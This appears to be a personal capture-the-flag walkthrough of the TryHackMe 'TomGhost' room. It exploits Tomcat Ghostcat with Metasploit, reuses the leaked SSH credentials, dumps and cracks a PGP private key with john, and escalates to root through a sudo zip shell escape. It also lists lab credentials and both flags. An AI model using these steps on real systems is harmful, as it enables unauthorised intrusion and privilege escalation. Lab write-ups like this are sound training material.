# THM — TomGhost

---

### Reconnaissance

**Active Recon**
- ✅ Port scanning (top 1000)

  > `[05/25/26 15:30:33]`
  > ```
  > PORT     STATE SERVICE
  > 22/tcp   open  ssh
  > 53/tcp   open  domain
  > 8009/tcp open  ajp13
  > 8080/tcp open  http-proxy
  > ```

- ✅ Service/version fingerprinting

  > `[05/25/26 15:37:06]`
  > ```
  > PORT     STATE SERVICE    VERSION
  > 22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  > 53/tcp   open  tcpwrapped
  > 8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
  > 8080/tcp open  http       Apache Tomcat 9.0.30
  > ```

- ✅ Web technology fingerprinting

  > `[05/25/26 15:33:17]`
  > ```
  > Apache Tomcat/9.0.30
  > ```

---

### Enumeration — 2/16 Completed

**Web Application**
- ✅ Inspector
- ✅ Robots.txt & sitemap.xml review

**Service Exploitation**
- ✅ Metasploit Framework

  > `[05/25/26 15:59:59]`
  > See quick notes

---

### Post-Exploitation — 3/20 Completed

**Local PrivEsc**
- ✅ SUID/SGID binary abuse (Linux)

  > `[05/25/26 16:01:34]`
  > SUID search found
  > ```
  > skyfuck@ubuntu:~$ find / -perm -4000 -type f 2>/dev/null
  > /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  > /usr/lib/openssh/ssh-keysign
  > /usr/lib/eject/dmcrypt-get-device
  > /usr/bin/vmware-user-suid-wrapper
  > /usr/bin/sudo
  > /usr/bin/passwd
  > /usr/bin/gpasswd
  > /usr/bin/chsh
  > /usr/bin/chfn
  > /usr/bin/newgrp
  > /bin/mount
  > /bin/ping
  > /bin/umount
  > /bin/fusermount
  > /bin/su
  > /bin/ping6
  > ```

  > `[05/25/26 16:04:40]`
  > None of these seem to be valid

  > `[05/25/26 16:33:19]`
  > Same SUID for merlin

- ✅ Sudo misconfigurations

  > `[05/25/26 16:32:33]`
  > ```
  > merlin@ubuntu:/home/skyfuck$ sudo -l
  > Matching Defaults entries for merlin on ubuntu:
  >     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  > 
  > User merlin may run the following commands on ubuntu:
  >     (root : root) NOPASSWD: /usr/bin/zip
  > ```

- ✅ Cron job / scheduled task abuse

  > `[05/25/26 16:07:09]`
  > A potential priv esc in cron
  > ```
  > skyfuck@ubuntu:~$ cat /etc/crontab
  > # /etc/crontab: system-wide crontab
  > # Unlike any other crontab you don't have to run the `crontab'
  > # command to install the new version when you edit this file
  > # and files in /etc/cron.d. These files also have username fields,
  > # that none of the other crontabs do.
  > 
  > SHELL=/bin/sh
  > PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
  > 
  > # m h dom mon dow user  command
  > 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
  > 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
  > 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
  > 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
  > *  *    * * *   root    cd /root/ufw && bash ufw.sh
  > ```

---

## Engagement Notes

---

### `[05/25/26 15:31:02]`

NMAP

```
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
8009/tcp open  ajp13
8080/tcp open  http-proxy
```

---

### `[05/25/26 15:33:40]`

found Apache Tomcat/9.0.30 on port 8080

---

### `[05/25/26 15:34:28]`

I've run into tomcat recently, Let's see if I can gain access through metasploit

---

### `[05/25/26 15:40:54]`

Ran the following in metasploit

```
Module options (auxiliary/admin/http/tomcat_ghostcat):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   FILENAME  /WEB-INF/web.xml  yes       File name
   RHOSTS    10.144.190.33     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics
                                         /using-metasploit.html
   RPORT     8009              yes       The Apache JServ Protocol (AJP) port (TCP)
```

---

### `[05/25/26 15:41:21]`

found potential creds

```
 <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
  </description>
```

---

### `[05/25/26 15:42:08]`

the full txt is saved at `/home/kali/.msf4/loot/20260525153951_default_10.144.190.33_WEBINFweb.xml_210376.txt`

---

### `[05/25/26 15:45:35]`

The found creds work

```
skyfuck:8730281lkjlkjdqlksalks
```

---

### `[05/25/26 15:47:26]`

I'm able to login. One interesting file is credential.pgp and another tryhackme.asc

Looking up .asc, it looks like it may be important too

---

### `[05/25/26 15:47:45]`

the .asc is indeed a private key

```
skyfuck@ubuntu:~$ cat tryhackme.asc 
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG v1.63

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
kG6wLdznOpe4zaLA/vM=
=dMrv
-----END PGP PRIVATE KEY BLOCK-----
```

---

### `[05/25/26 15:49:03]`

sudo -l has no privs for skyfuck

---

### `[05/25/26 15:54:34]`

I was able to use the following to import the private key

```
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

---

### `[05/25/26 15:55:03]`

Now, it appears I need to find a passphrase

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
Enter passphrase:
```

---

### `[05/25/26 15:57:56]` — 🔑 Flag 1 Found

Looking for the passphrase, I found the first flag. The GPG might be a red herring.

```
skyfuck@ubuntu:~$ cat note.txt 
skyfuck@ubuntu:~$ cd /home/merlin/
skyfuck@ubuntu:/home/merlin$ ls
user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
```

---

### `[05/25/26 15:58:37]`

just for fun, I'll also try the flag as the passphrase

---

### `[05/25/26 16:05:32]`

I tried /bin/su anyway. no dice

---

### `[05/25/26 16:07:09]`

A potential priv esc in cron

```
skyfuck@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /root/ufw && bash ufw.sh
```

---

### `[05/25/26 16:10:09]`

I tried to su to merlin w/o creds, no result

```
skyfuck@ubuntu:~$ su merlin
Password: 
su: Authentication failure
```

---

### `[05/25/26 16:16:44]`

a search for .bak files didn't turn up anything interesting.

```
skyfuck@ubuntu:/etc$ find / -name *.bak 2>/dev/null
/etc/apt/sources.bak
skyfuck@ubuntu:/etc$ cat /etc/apt/sources.bak
```

---

### `[05/25/26 16:27:31]`

trying a different approach, I coppied the private key to my local machine and was able to use john to find new creds.

```
┌──(kali㉿kali)-[~/tmp]
└─$ gpg2john thm.asc > key.txt              

File thm.asc
                                                                                                                           
┌──(kali㉿kali)-[~/tmp]
└─$ ls
key.txt  thm.asc
                                                                                                                           
┌──(kali㉿kali)-[~/tmp]
└─$ cat key.txt   
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::thm.asc
                                                                                                                           
┌──(kali㉿kali)-[~/tmp]
└─$ john key.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2026-05-25 16:23) 100.0g/s 128000p/s 128000c/s 128000C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

---

### `[05/25/26 16:27:55]`

new creds!!

```
alexandru:tryhackme
```

---

### `[05/25/26 16:31:11]`

When running gpg again, I think I found a hash with alexandru

```
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

---

### `[05/25/26 16:31:49]`

or maybe that's merlins password..

---

### `[05/25/26 16:32:33]`

```
merlin@ubuntu:/home/skyfuck$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

---

### `[05/25/26 16:33:19]`

Same SUID for merlin

---

### `[05/25/26 16:40:01]`

I think something interesting is with the /usr/bin/zip sudo priv

```
merlin@ubuntu:/etc$ cat /etc/shadow
cat: /etc/shadow: Permission denied
merlin@ubuntu:/etc$ /usr/bin/zip archive.zip shadow
zip I/O error: Permission denied
zip error: Could not create output file (archive.zip)
```

no luck here. perhaps something in GTFO bins?

---

### `[05/25/26 16:40:56]`

I found this at GTFO, let's see what I can do with it

```
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

---

### `[05/25/26 16:49:25]`

I wasn't able to get to far with this.

```
merlin@ubuntu:~$ zip /home/merlin/shad.zip /etc/shadow
  adding: etc/shadow
zip warning: Permission denied
        zip warning: could not open for reading: etc/shadow

zip warning: Not all files were readable
  files/entries read:  0 (0 bytes)  skipped:  1 (1.1K bytes)
        zip warning: zip file empty
merlin@ubuntu:~$ zip /home/merlin/shad.zip /root/root.txt
        zip warning: name not matched: /root/root.txt

zip error: Nothing to do! (/home/merlin/shad.zip)
merlin@ubuntu:~$ zip /home/merlin/shad.zip /root.txt
        zip warning: name not matched: /root.txt

zip error: Nothing to do! (/home/merlin/shad.zip)
merlin@ubuntu:~$ find / -name root.txt 2>/dev/null
```

I also didn't find anything looking for a root.txt

---

### `[05/25/26 16:49:57]`

I'll try a shell from GTFO

```
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```

---

### `[05/25/26 16:52:06]`

still nothing promising

```
merlin@ubuntu:/usr/bin$ zip /home/merlin/shad.zip /etc/hosts -T -TT '/bin/sh #'
  adding: etc/hosts (deflated 31%)
$ whoami
merlin
$ id
uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
$
```

---

### `[05/25/26 16:57:54]` — 🔑 Flag 2 Found

Thinking this is for sure the right path, I looked up a few tutorials on this room. It seems that everyone else used GTFO bins as well, but was getting different commands from GTFO. I was able to use the other commands I found to gain root and find the flag.

```
merlin@ubuntu:/usr/bin$ TF=$(mktemp -u)
merlin@ubuntu:/usr/bin$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root.txt
cat: /root.txt: No such file or directory
# cat /root/root.txt
THM{Z1P_1S_FAKE}
```

---

### `[05/25/26 16:57:58]`

DONE!

---

## Flags Summary

| Flag | Value |
|------|-------|
| User flag | `THM{GhostCat_1s_so_cr4sy}` |
| Root flag | `THM{Z1P_1S_FAKE}` |
